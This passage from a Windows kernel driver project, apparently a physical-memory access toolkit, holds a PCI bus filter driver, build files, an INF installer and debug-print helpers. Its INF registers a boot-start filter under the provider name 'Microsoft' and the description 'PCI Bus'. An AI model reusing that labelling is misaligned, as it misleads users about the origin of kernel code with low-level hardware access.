	RtlInitUnicodeString(&devNameU, L"\\Device\\PhyMemPCIFilter");

	//create a filter device object.
	//!! will crash the system if it has more than one pci bus   !!
	//!! device name should change to PhyMemPCIFilter01, 02, ... !!
	ntStatus=IoCreateDevice( dro,
							 sizeof(DEVICE_EXTENSION),
							 &devNameU,
							 FILE_DEVICE_UNKNOWN,
							 FILE_DEVICE_SECURE_OPEN,
							 FALSE,
							 &fido);

	if (!NT_SUCCESS(ntStatus))
	{
		//Returning failure here prevents the entire stack from functioning,
		//but most likely the rest of the stack will not be able to create
		//device objects either, so it is still OK.
		return ntStatus;
	}

	dx=(PDEVICE_EXTENSION)fido->DeviceExtension;

	//initialize remove lock
	IoInitializeRemoveLock(&dx->rmLock, 'FICP', 1, 5);

	//attach to pci bus driver
	dx->lowerdo=IoAttachDeviceToDeviceStack(fido, pdo);
	if(dx->lowerdo==NULL)
	{
		//Failure for attachment is an indication of a broken plug & play system.
		IoDeleteDevice(fido);
		return STATUS_UNSUCCESSFUL;
	}

	//flags needs inherit from lower device object(pci bus driver)
	fido->Flags|=(dx->lowerdo->Flags & (DO_BUFFERED_IO|DO_DIRECT_IO|DO_POWER_PAGABLE));

	//update device type
	fido->DeviceType=dx->lowerdo->DeviceType;

	//update device characteristics
	fido->Characteristics=dx->lowerdo->Characteristics;

	//save physical device object
	dx->pdo=pdo;

	//set the initial state of the Filter DO
	INITIALIZE_PNP_STATE(dx);

	DebugPrintMsg("AddDevice succeeded");
	DebugPrint("PCI pdo=0x%x, fdo=0x%x, fido=0x%x", pdo, dx->lowerdo, fido);

	fido->Flags&=~DO_DEVICE_INITIALIZING;

	return STATUS_SUCCESS;
}

//skip irp, just pass down
NTSTATUS PassIRP(IN PDEVICE_OBJECT fido, IN PIRP irp)
{
	PDEVICE_EXTENSION dx;
	NTSTATUS ntStatus;

	dx=(PDEVICE_EXTENSION)fido->DeviceExtension;

	//acquire remove lock
	ntStatus=IoAcquireRemoveLock(&dx->rmLock, irp);
	if (!NT_SUCCESS(ntStatus))
	{
		//complete irp if cannot acquire remove lock
		irp->IoStatus.Status=ntStatus;
		irp->IoStatus.Information=0;
		IoCompleteRequest(irp, IO_NO_INCREMENT);
		return ntStatus;
	}

	//just pass irp down, we never need it
	IoSkipCurrentIrpStackLocation(irp);
	ntStatus=IoCallDriver(dx->lowerdo, irp);

	//release remove lock
	IoReleaseRemoveLock(&dx->rmLock, irp);

	return ntStatus;
}

//pnp handler
NTSTATUS PCIFltPnp(IN PDEVICE_OBJECT fido, IN PIRP irp)
{
	PDEVICE_EXTENSION dx;
	PIO_STACK_LOCATION irpStack;
	NTSTATUS ntStatus;

	PAGED_CODE();

	dx=(PDEVICE_EXTENSION)fido->DeviceExtension;
	irpStack=IoGetCurrentIrpStackLocation(irp);

	//acquire remove lock
	ntStatus=IoAcquireRemoveLock(&dx->rmLock, irp);
	if (!NT_SUCCESS(ntStatus))
	{
		//complete irp if cannot acquire remove lock
		irp->IoStatus.Status=ntStatus;
		irp->IoStatus.Information=0;
		IoCompleteRequest(irp, IO_NO_INCREMENT);
		return ntStatus;
	}

	//default to success
	ntStatus=STATUS_SUCCESS;

	switch (irpStack->MinorFunction)
	{
	case IRP_MN_START_DEVICE:
		//The device is starting.
		//We cannot touch the device (send it any non pnp irps) until a
		//start device has been passed down to the lower drivers.
		IoCopyCurrentIrpStackLocationToNext(irp);
		IoSetCompletionRoutine( irp,
								(PIO_COMPLETION_ROUTINE)StartCompletion,
								NULL,
								TRUE,
								TRUE,
								TRUE);

		return IoCallDriver(dx->lowerdo, irp);

	case IRP_MN_REMOVE_DEVICE:

		IoSkipCurrentIrpStackLocation(irp);
		ntStatus=IoCallDriver(dx->lowerdo, irp);

		//release remove lock, wait until all acquisitions has been released 
		IoReleaseRemoveLockAndWait(&dx->rmLock, irp);

		SET_NEW_PNP_STATE(dx, Deleted);

		IoDetachDevice(dx->lowerdo);
		IoDeleteDevice(fido);

		return ntStatus;

	case IRP_MN_QUERY_STOP_DEVICE:

		SET_NEW_PNP_STATE(dx, StopPending);

		break;

	case IRP_MN_CANCEL_STOP_DEVICE:
		//Check to see whether you have received cancel-stop
		//without first receiving a query-stop. This could happen if someone
		//above us fails a query-stop and passes down the subsequent
		//cancel-stop.
		if(dx->DevicePnPState==StopPending)
		{
			//We did receive a query-stop, so restore.
			RESTORE_PREVIOUS_PNP_STATE(dx);
		}
		//We must not fail this IRP.

		break;

	case IRP_MN_STOP_DEVICE:

		SET_NEW_PNP_STATE(dx, Stopped);

		break;

	case IRP_MN_QUERY_REMOVE_DEVICE:

		SET_NEW_PNP_STATE(dx, RemovePending);

		break;

	case IRP_MN_SURPRISE_REMOVAL:

		SET_NEW_PNP_STATE(dx, SurpriseRemovePending);

		break;

	case IRP_MN_CANCEL_REMOVE_DEVICE:
		//Check to see whether you have received cancel-remove
		//without first receiving a query-remove. This could happen if
		//someone above us fails a query-remove and passes down the
		//subsequent cancel-remove.
		if(dx->DevicePnPState==RemovePending)
		{
			//We did receive a query-remove, so restore.
			RESTORE_PREVIOUS_PNP_STATE(dx);
		}
		//We must not fail this IRP.

		break;

	case IRP_MN_DEVICE_USAGE_NOTIFICATION:
		//On the way down, pagable might become set. Mimic the driver
		//above us. If no one is above us, just set pagable.
		if ((fido->AttachedDevice==NULL) ||
			(fido->AttachedDevice->Flags & DO_POWER_PAGABLE))
		{
			fido->Flags |= DO_POWER_PAGABLE;
		}

		IoCopyCurrentIrpStackLocationToNext(irp);
		IoSetCompletionRoutine( irp,
								DevUsgNotifyCompletion,
								NULL,
								TRUE,
								TRUE,
								TRUE);

		return IoCallDriver(dx->lowerdo, irp);

	default:

		break;
	}

	//Pass irp down and forget it.
	IoSkipCurrentIrpStackLocation(irp);
	ntStatus=IoCallDriver(dx->lowerdo, irp);

	//release remove lock
	IoReleaseRemoveLock(&dx->rmLock, irp);

	return ntStatus;
}

//PNP START DEVICE irp completion routine
NTSTATUS StartCompletion(IN PDEVICE_OBJECT fido, IN PIRP irp, IN PVOID Context)
{
	PDEVICE_EXTENSION dx;

	UNREFERENCED_PARAMETER(Context);

	dx=(PDEVICE_EXTENSION)fido->DeviceExtension;

	//must do this if we don't return STATUS_MORE_PROCESSING_REQUIRED !
	if (irp->PendingReturned)
		IoMarkIrpPending(irp);

	if (NT_SUCCESS(irp->IoStatus.Status))
	{
		//As we are successfully now back, we will
		//first set our state to Started.
		SET_NEW_PNP_STATE(dx, Started);

		//On the way up inherit FILE_REMOVABLE_MEDIA during Start.
		//This characteristic is available only after the driver stack is started!.
		if (dx->lowerdo->Characteristics & FILE_REMOVABLE_MEDIA)
		{
			fido->Characteristics |= FILE_REMOVABLE_MEDIA;
		}
	}

	//release remove lock
	IoReleaseRemoveLock(&dx->rmLock, irp);

	return STATUS_SUCCESS;
}

//PNP DEVICE USAGE NOTIFICATION irp completion routine
NTSTATUS DevUsgNotifyCompletion(IN PDEVICE_OBJECT fido,	IN PIRP	irp, IN PVOID Context)
{
	PDEVICE_EXTENSION dx;

	UNREFERENCED_PARAMETER(Context);

	dx=(PDEVICE_EXTENSION)fido->DeviceExtension;

	//must do this if we don't return STATUS_MORE_PROCESSING_REQUIRED !
	if (irp->PendingReturned)
	{
		IoMarkIrpPending(irp);
	}

	//On the way up, pagable might become clear. Mimic the driver below us.
	if (!(dx->lowerdo->Flags & DO_POWER_PAGABLE))
	{
		fido->Flags &= ~DO_POWER_PAGABLE;
	}

	//release remove lock
	IoReleaseRemoveLock(&dx->rmLock, irp);

	return STATUS_SUCCESS;
}

//power pnp
NTSTATUS PCIFltPower(IN PDEVICE_OBJECT fido, IN PIRP irp)
{
	PDEVICE_EXTENSION dx;
	NTSTATUS ntStatus;

	dx=(PDEVICE_EXTENSION)fido->DeviceExtension;

	PoStartNextPowerIrp(irp);

	//acquire remove lock
	ntStatus=IoAcquireRemoveLock(&dx->rmLock, irp);
	if (!NT_SUCCESS(ntStatus))
	{
		//complete irp if cannot acquire remove lock
		irp->IoStatus.Status=ntStatus;
		irp->IoStatus.Information=0;
		IoCompleteRequest(irp, IO_NO_INCREMENT);
		return ntStatus;
	}

	IoSkipCurrentIrpStackLocation(irp);
	ntStatus=PoCallDriver(dx->lowerdo, irp);

	//release remove lock
	IoReleaseRemoveLock(&dx->rmLock, irp);

	return ntStatus;
}

//CREATE
NTSTATUS PCIFltCreate(IN PDEVICE_OBJECT fido, IN PIRP irp)
{
	UNREFERENCED_PARAMETER(fido);

	irp->IoStatus.Status=STATUS_SUCCESS;
	irp->IoStatus.Information=0;

	IoCompleteRequest(irp, IO_NO_INCREMENT);

	DebugPrintMsg("IRP_MJ_CREATE");

	return STATUS_SUCCESS;
}

//CLOSE
NTSTATUS PCIFltClose(IN PDEVICE_OBJECT fido, IN PIRP irp)
{
	UNREFERENCED_PARAMETER(fido);

	irp->IoStatus.Status=STATUS_SUCCESS;
	irp->IoStatus.Information=0;

	IoCompleteRequest(irp, IO_NO_INCREMENT);

	DebugPrintMsg("IRP_MJ_CLOSE");

	return STATUS_SUCCESS;
}

//DEVICE CONTROL
NTSTATUS PCIFltDevCtl(IN PDEVICE_OBJECT fido, IN PIRP irp)
{
	return PassIRP(fido, irp);
}

//driver unload
VOID PCIFltUnload(IN PDRIVER_OBJECT dro)
{
	PAGED_CODE();

	//The device object(s) should be NULL now
	//since we unload, all the devices objects associated with this
	//driver must be deleted.
	ASSERT(dro->DeviceObject==NULL);

	//We should not be unloaded until all the devices we control
	//have been removed from our queue.

	DebugPrintClose();

	return;
}

```

`source/WormholeDrivers/PHYMEM/PCIFlt/PCIFilter.h`:

```h
#ifndef	__PCIFILTER_H
#define	__PCIFILTER_H

typedef enum tagDEVICE_PNP_STATE
{
	NotStarted=0,           // Not started yet
	Started,                // Device has received the START_DEVICE IRP
	StopPending,            // Device has received the QUERY_STOP IRP
	Stopped,                // Device has received the STOP_DEVICE IRP
	RemovePending,          // Device has received the QUERY_REMOVE IRP
	SurpriseRemovePending,  // Device has received the SURPRISE_REMOVE IRP
	Deleted                 // Device has received the REMOVE_DEVICE IRP
} DEVICE_PNP_STATE;

#define INITIALIZE_PNP_STATE(_Data_)	\
	(_Data_)->DevicePnPState=NotStarted;\
	(_Data_)->PreviousPnPState=NotStarted;

#define SET_NEW_PNP_STATE(_Data_, _state_)	\
	(_Data_)->PreviousPnPState=(_Data_)->DevicePnPState;	\
	(_Data_)->DevicePnPState=(_state_);

#define RESTORE_PREVIOUS_PNP_STATE(_Data_)	\
	(_Data_)->DevicePnPState=(_Data_)->PreviousPnPState;

typedef struct tagDEVICE_EXTENSION
{
	//physical device object
	PDEVICE_OBJECT pdo;

	//the device object we attached to
	PDEVICE_OBJECT lowerdo;

	//current pnp state
	DEVICE_PNP_STATE DevicePnPState;

	//previous pnp state
	DEVICE_PNP_STATE PreviousPnPState;

	//Remove Lock
	IO_REMOVE_LOCK rmLock;

} DEVICE_EXTENSION, *PDEVICE_EXTENSION;

#endif	//__PCIFILTERZ_H
```

`source/WormholeDrivers/PHYMEM/PCIFlt/PCIFlt.dsp`:

```dsp
# Microsoft Developer Studio Project File - Name="PCIFlt" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=PCIFlt - Win32 Debug
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "PCIFlt.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "PCIFlt.mak" CFG="PCIFlt - Win32 Debug"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "PCIFlt - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE "PCIFlt - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "PCIFlt - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /Gz /W3 /Zi /Oi /I "$(DDKROOT)\inc\wxp" /I "$(DDKROOT)\inc\ddk\wxp" /I "$(DDKROOT)\inc\ddk\wdm\wxp" /I "$(DDKROOT)\inc\crt" /I "$(DDKROOT)\inc\crt\gl" /I "$(DDKROOT)\inc\crt\sys" /D "WIN32" /D "NDEBUG" /D "_X86_" /D DBG=0 /D _WIN32_WINNT=0x0501 /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "NDEBUG"
# ADD RSC /l 0x804 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386 /out:"Release/PCIFlt.sys"
# ADD LINK32 wdm.lib /nologo /base:"0x10000" /stack:0x40000,0x1000 /entry:"DriverEntry" /machine:I386 /nodefaultlib /out:"Release/PCIFlt.sys" /libpath:"$(DDKROOT)\lib\wxp\i386" /subsystem:NATIVE,5.1 /driver /IGNORE:4078 /RELEASE /SECTION:INIT,D

!ELSEIF  "$(CFG)" == "PCIFlt - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 1
# PROP BASE Output_Dir "Debug"
# PROP BASE Intermediate_Dir "Debug"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 1
# PROP Output_Dir "Debug"
# PROP Intermediate_Dir "Debug"
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /GZ /c
# ADD CPP /nologo /Gz /W3 /Zi /Oi /I "$(DDKROOT)\inc\wxp" /I "$(DDKROOT)\inc\ddk\wxp" /I "$(DDKROOT)\inc\ddk\wdm\wxp" /I "$(DDKROOT)\inc\crt" /I "$(DDKROOT)\inc\crt\gl" /I "$(DDKROOT)\inc\crt\sys" /D "WIN32" /D "_DEBUG" /D "_X86_" /D DBG=1 /D _WIN32_WINNT=0x0501 /YX /FD /c
# ADD BASE MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "_DEBUG"
# ADD RSC /l 0x804 /d "_DEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /debug /machine:I386 /out:"Debug/PCIFlt.sys" /pdbtype:sept
# ADD LINK32 wdm.lib /nologo /base:"0x10000" /stack:0x40000,0x1000 /entry:"DriverEntry" /incremental:no /debug /machine:I386 /nodefaultlib /out:"Debug/PCIFlt.sys" /libpath:"$(DDKROOT)\lib\wxp\i386" /subsystem:NATIVE,5.1 /driver /IGNORE:4078

!ENDIF 

# Begin Target

# Name "PCIFlt - Win32 Release"
# Name "PCIFlt - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Source File

SOURCE=.\DebugPrint.c
# End Source File
# Begin Source File

SOURCE=.\PCIFilter.c
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Source File

SOURCE=.\DebugPrint.h
# End Source File
# Begin Source File

SOURCE=.\PCIFilter.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# End Group
# End Target
# End Project

```

`source/WormholeDrivers/PHYMEM/PCIFlt/PCIFlt.dsw`:

```dsw
Microsoft Developer Studio Workspace File, Format Version 6.00
# WARNING: DO NOT EDIT OR DELETE THIS WORKSPACE FILE!

###############################################################################

Project: "PCIFlt"=.\PCIFlt.dsp - Package Owner=<4>

Package=<5>
{{{
}}}

Package=<4>
{{{
}}}

###############################################################################

Global:

Package=<5>
{{{
}}}

Package=<3>
{{{
}}}

###############################################################################


```

`source/WormholeDrivers/PHYMEM/PCIFlt/Release/PCIFilter.inf`:

```inf
; phymem pci filter driver inf
; akui
; 2009/3/8

[Version]
Signature="$WINDOWS NT$"
Class=System
ClassGuid={4D36E97D-E325-11CE-BFC1-08002BE10318}
Provider=%MSFT%
DriverVer=08/03/2008,1.00.0000.1

[Manufacturer]
%STDDEV%=PHYMEM_PCIF

[PHYMEM_PCIF]
%PHYMEM.DeviceDesc%=PHYMEM_Filter, *pnp0a03

;;;;; files ;;;;;

[SourceDisksNames]
1 = %DISK_NAME%,,,""

[SourceDisksFiles]
pciflt.sys = 1,,

[Drivers_Dir]
pciflt.sys

[DestinationDirs]
DefaultDestDir = 12

[PHYMEM_Filter.NT]
CopyFiles=Drivers_Dir

;;;;; registry ;;;;;;

[PHYMEM_Filter.NT.HW]
AddReg = PHYMEM_Filter_AddReg

[PHYMEM_Filter_AddReg]
HKR,,"UpperFilters", 0x00010000, "pcifilter"

;;;;; install pcifilter service ;;;;;;

[PHYMEM_Filter.NT.Services]
AddService = pci, %SPSVCINST_ASSOCSERVICE%, pci_ServiceInst
AddService = pcifilter,,PHYMEM_ServiceInst

[PHYMEM_Filter.CoInstallers]
[pci_ServiceInst]
DisplayName    = "PCI Bus Driver"
ServiceType    = %SERVICE_KERNEL_DRIVER%
StartType      = %SERVICE_BOOT_START%
ErrorControl   = %SERVICE_ERROR_NORMAL%
ServiceBinary  = %12%\pci.sys
LoadOrderGroup = "Boot Bus Extender"

[PHYMEM_ServiceInst]
DisplayName    = %PHYMEM_svcdesc%
ServiceType    = %SERVICE_KERNEL_DRIVER%
StartType      = %SERVICE_BOOT_START%
ErrorControl   = %SERVICE_ERROR_NORMAL%
ServiceBinary  = %12%\pciflt.sys
LoadOrderGroup = "PnP Filter"

;;;;; string definition ;;;;;;;;

[Strings]
MSFT = "Microsoft"
STDDEV = "(Standard system devices)"
PHYMEM.DeviceDesc = "PCI Bus"
SystemClassName = "System devices"
PHYMEM_svcdesc = "Phymem PCI Filter Driver"
DISK_NAME = "PhyMem PCI Filter Driver Install Disk"
SPSVCINST_ASSOCSERVICE = 0x00000002
SERVICE_KERNEL_DRIVER  = 1
SERVICE_BOOT_START     = 0
SERVICE_DEMAND_START   = 3
SERVICE_ERROR_NORMAL   = 1

[Strings.0804]
MSFT = "Microsoft"
STDDEV = "(标准系统设备)"
PHYMEM.DeviceDesc = "PCI Bus"
SystemClassName = "System devices"
PHYMEM_svcdesc = "Phymem PCI Filter Driver"
DISK_NAME = "PhyMem PCI Filter Driver Install Disk"
SPSVCINST_ASSOCSERVICE = 0x00000002
SERVICE_KERNEL_DRIVER  = 1
SERVICE_BOOT_START     = 0
SERVICE_DEMAND_START   = 3
SERVICE_ERROR_NORMAL   = 1

```

`source/WormholeDrivers/PHYMEM/PhyMem/driver/AccessBus.c`:

```c
/*++
access pci bus configuration
--*/

#include <ntddk.h>
#include <wdmguid.h>
#include "DebugPrint.h"

//gets the bus interface standard information from the PDO.
NTSTATUS GetBusInterface(IN PDEVICE_OBJECT pcifido,
	OUT PPCI_BUS_INTERFACE_STANDARD	busInterface)
{
	KEVENT event;
	NTSTATUS ntStatus;
	PIRP irp;
	IO_STATUS_BLOCK ioStatus;
	PIO_STACK_LOCATION irpStack;

	if (pcifido==NULL)
		return STATUS_UNSUCCESSFUL;

	KeInitializeEvent(&event, NotificationEvent, FALSE);

	irp=IoBuildSynchronousFsdRequest(IRP_MJ_PNP,
									 pcifido,
									 NULL,
									 0,
									 NULL,
									 &event,
									 &ioStatus);

	if (irp==NULL)
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	irpStack=IoGetNextIrpStackLocation(irp);
	irpStack->MinorFunction=IRP_MN_QUERY_INTERFACE;
	irpStack->Parameters.QueryInterface.InterfaceType=(LPGUID)&GUID_PCI_BUS_INTERFACE_STANDARD;
	irpStack->Parameters.QueryInterface.Size=sizeof(PCI_BUS_INTERFACE_STANDARD);
	irpStack->Parameters.QueryInterface.Version=PCI_BUS_INTERFACE_STANDARD_VERSION;
	irpStack->Parameters.QueryInterface.Interface=(PINTERFACE)busInterface;
	irpStack->Parameters.QueryInterface.InterfaceSpecificData=NULL;

	//initialize the status to error in case the bus driver does not 
	//set it correctly.
	irp->IoStatus.Status=STATUS_NOT_SUPPORTED ;

	ntStatus=IoCallDriver(pcifido, irp);

	if (ntStatus==STATUS_PENDING)
	{
		KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);

		ntStatus=ioStatus.Status;
	}

	return ntStatus;
}

```

`source/WormholeDrivers/PHYMEM/PhyMem/driver/DebugPrint.c`:

```c
//////////////////////////////////////////////////////////////////////////////
//	Copyright © 1998,1999 PHD Computer Consultants Ltd
//
//	DebugPrint code to add to a test driver		http://www.phdcc.com/debugprint/
/////////////////////////////////////////////////////////////////////////////
//	DebugPrint.cpp:			Debug printing in test driver
/////////////////////////////////////////////////////////////////////////////
//	DebugPrintInit			Initialise DebugPrint
//	DebugPrintMsg			Print ANSI string
//	DebugPrintClose			Close DebugPrint
//	DebugPrint				Formatted print, allocating 100 byte print buffer
//	DebugPrint2				Formatted print, specifying print buffer size
//*	DebugPrintVA			Allocate DebugPrint buffer and call DebugSprintf
//*	PrintXxx				Print various types to buffer
//*	DebugSprintf			Do formatted print to buffer
//*	ANSIstrlen				Get ANSI string length
//*	DebugPrintSystemThread	System thread to print device events.
//*	OpenDebugPrintDriver	Attempt to open DebugPrt driver for 5 mins
//*	ClearEvents				Clear any remaining events
/////////////////////////////////////////////////////////////////////////////
//	DebugPrinting occurs automatically in checked build
//	To force debug printing in free build, #define DEBUGPRINT 1
/////////////////////////////////////////////////////////////////////////////
//	Format specification characters
//		%c	ANSI char
//		%C	Wide char
//		%d	Signed int in decimal
//		%D	__int64 in decimal
//		%i	Signed int in decimal
//		%I	IRP
//		%l	__int64 in hex
//		%L	LARGE_INTEGER in hex
//		%s	null-terminated ANSI char string
//		%S	null-terminated Wide char string
//		%T	PUNICODE_STRING
//		%u	ULONG in decimal
//		%x	ULONG in hex
//
//	Be very careful to provide appropriate parameters for the formatted string
//	in your calls to DebugPrint.
/////////////////////////////////////////////////////////////////////////////
//	Version history
//	7-Dec-98	1.0.0	CC	creation
//	17-Dec-98	1.0.1	CC	DriverName allocated from NonPagedPool
//	21-Dec-98	1.0.1	CC	sizeof char * used properly
//	28-Dec-98	1.0.2	CC	%* allowed for %sSx
//	22-Jan-99	1.0.3	CC	%D, %l, %L added.  width>'9' allowed
//	16-Feb-99	1.0.4	CC	RtlInitUnicodeString used
//	31-Mar-99	1.0.5	CC	Altered to make it work in NT4
//	24-Apr-99	1.0.5	CC	DebugPrintClose checks DebugPrintStarted
//	25-Apr-99	1.0.5	CC	System thread tries for 5 mins to open DebugPrt
//	13-May-99	1.0.6	CC	IRP_MN_QUERY_LEGACY_BUS_INFORMATION added
//	19-May-99	1.0.6	CC	ThreadExiting ensures that thread finished before unload
/////////////////////////////////////////////////////////////////////////////

#ifdef __cplusplus
extern "C"
{
#endif
#include <wdm.h>
#ifdef __cplusplus
}
#endif

#include "debugprint.h"
#include <stdarg.h>	// OK to use this for va_* macros

#if DODEBUGPRINT

//////////////////////////////////////////////////////////////////////////////
//	Definitions copied from Wdm.h to make this compile in NT4
//	Cross-fingers - lets hope these definitions do not change

#define Dbp_IRP_MJ_POWER                    0x16
#define Dbp_IRP_MJ_SYSTEM_CONTROL           0x17
#define Dbp_IRP_MJ_PNP                      0x1b

#define Dbp_IRP_MN_QUERY_DEVICE_RELATIONS       0x07

#define Dbp_IRP_MN_SET_POWER                    0x02
#define Dbp_IRP_MN_QUERY_POWER                  0x03

typedef enum Dbp__DEVICE_RELATION_TYPE {
    Dbp_BusRelations,
    Dbp_EjectionRelations,
    Dbp_PowerRelations,
    Dbp_RemovalRelations,
    Dbp_TargetDeviceRelation
} Dbp_DEVICE_RELATION_TYPE, *Dbp_PDEVICE_RELATION_TYPE;

typedef struct _Dbp_QueryDeviceRelations
{
	Dbp_DEVICE_RELATION_TYPE Type;
} Dbp_QueryDeviceRelations, *Dbp_PQueryDeviceRelations;

typedef enum _Dbp_SYSTEM_POWER_STATE {
    Dbp_PowerSystemUnspecified = 0,
    Dbp_PowerSystemWorking,
    Dbp_PowerSystemSleeping1,
    Dbp_PowerSystemSleeping2,
    Dbp_PowerSystemSleeping3,
    Dbp_PowerSystemHibernate,
    Dbp_PowerSystemShutdown,
    Dbp_PowerSystemMaximum
} Dbp_SYSTEM_POWER_STATE, *Dbp_PSYSTEM_POWER_STATE;

typedef enum {
    Dbp_PowerActionNone,
    Dbp_PowerActionReserved,
    Dbp_PowerActionSleep,
    Dbp_PowerActionHibernate,
    Dbp_PowerActionShutdown,
    Dbp_PowerActionShutdownReset,
    Dbp_PowerActionShutdownOff
} Dbp_POWER_ACTION, *Dbp_PPOWER_ACTION;

typedef enum _Dbp_DEVICE_POWER_STATE {
    Dbp_PowerDeviceUnspecified = 0,
    Dbp_PowerDeviceD0,
    Dbp_PowerDeviceD1,
    Dbp_PowerDeviceD2,
    Dbp_PowerDeviceD3,
    Dbp_PowerDeviceMaximum
} Dbp_DEVICE_POWER_STATE, *Dbp_PDEVICE_POWER_STATE;

typedef enum _Dbp_POWER_STATE_TYPE {
    Dbp_SystemPowerState,
    Dbp_DevicePowerState
} Dbp_POWER_STATE_TYPE, *Dbp_PPOWER_STATE_TYPE;

typedef union _Dbp_POWER_STATE {
    Dbp_SYSTEM_POWER_STATE SystemState;
    Dbp_DEVICE_POWER_STATE DeviceState;
} Dbp_POWER_STATE, *Dbp_PPOWER_STATE;

typedef struct _Dbp_Power {
    ULONG SystemContext;
    Dbp_POWER_STATE_TYPE Type;
    Dbp_POWER_STATE State;
    Dbp_POWER_ACTION ShutdownType;
} Dbp_Power, *Dbp_PPower;

//////////////////////////////////////////////////////////////////////////////
//	DebugPrint globals

static BOOLEAN DebugPrintStarted = FALSE;
static char* DriverName = NULL;
static USHORT DriverNameLen = 0;

/////////////////////////////////////////////////////////////////////////////
//	DebugPrint Event structure (put in doubly-linked EventList)

typedef struct _DEBUGPRINT_EVENT
{
	LIST_ENTRY ListEntry;
	ULONG Len;
	UCHAR EventData[1];
} DEBUGPRINT_EVENT, *PDEBUGPRINT_EVENT;

//////////////////////////////////////////////////////////////////////////////
//	Globals to communicate with our system thread

PVOID ThreadObjectPointer=NULL;	// Thread pointer
BOOLEAN ExitNow;				// Set to cause thread to exit
KEVENT ThreadEvent;				// Set to make thread look at ExitNow.
LIST_ENTRY EventList;			// Doubly-linked list of written Events
KSPIN_LOCK EventListLock;		// Spin lock to guard access to EventList
KEVENT ThreadExiting;			// Set when thread exiting

void DebugPrintSystemThread( IN PVOID Context);
NTSTATUS OpenDebugPrintDriver( HANDLE* pDebugPrintDeviceHandle);

//////////////////////////////////////////////////////////////////////////////
//	DebugPrint local functions

HANDLE OpenDebugPrint();
void CloseDebugPrint( HANDLE h);
void DebugSprintf( char* buffer, int max, const char* format, va_list marker);
USHORT ANSIstrlen( char* str);
void ClearEvents();

//////////////////////////////////////////////////////////////////////////////
//	DebugPrintInit:		Initialise DebugPrint
//						Connect to DebugPrint driver at \Device\PHDDebugPrint
//
//	IRQL PASSIVE_LEVEL

void DebugPrintInit(char* _DriverName)
{
	HANDLE threadHandle;
	NTSTATUS status;

	// Copy the driver's name out of INIT code segment
	DriverNameLen = 1 + ANSIstrlen(_DriverName);
	DriverName = (char*)ExAllocatePool(NonPagedPool,DriverNameLen);
	if( DriverName==NULL) return;
	RtlCopyMemory( DriverName, _DriverName, DriverNameLen);

	/////////////////////////////////////////////////////////////////////////
	// Prepare for thread start

	ExitNow = FALSE;
	KeInitializeEvent(&ThreadEvent, SynchronizationEvent, FALSE);
	KeInitializeEvent(&ThreadExiting, SynchronizationEvent, FALSE);
	// Initialise event list
	KeInitializeSpinLock(&EventListLock);
	InitializeListHead(&EventList);

	/////////////////////////////////////////////////////////////////////////
	// Start system thread to write events to DebugPrint driver

	status = PsCreateSystemThread( &threadHandle, THREAD_ALL_ACCESS, NULL, NULL, NULL,
									DebugPrintSystemThread, NULL);
	if( !NT_SUCCESS(status))
		return;

	/////////////////////////////////////////////////////////////////////////
	// Save a pointer to thread and close handle.

	status = ObReferenceObjectByHandle( threadHandle, THREAD_ALL_ACCESS, NULL, KernelMode,
										&ThreadObjectPointer, NULL);

	if( NT_SUCCESS(status))
		ZwClose(threadHandle);
	else
	{
		// Uh oh... force thread to exit
		ExitNow = TRUE;
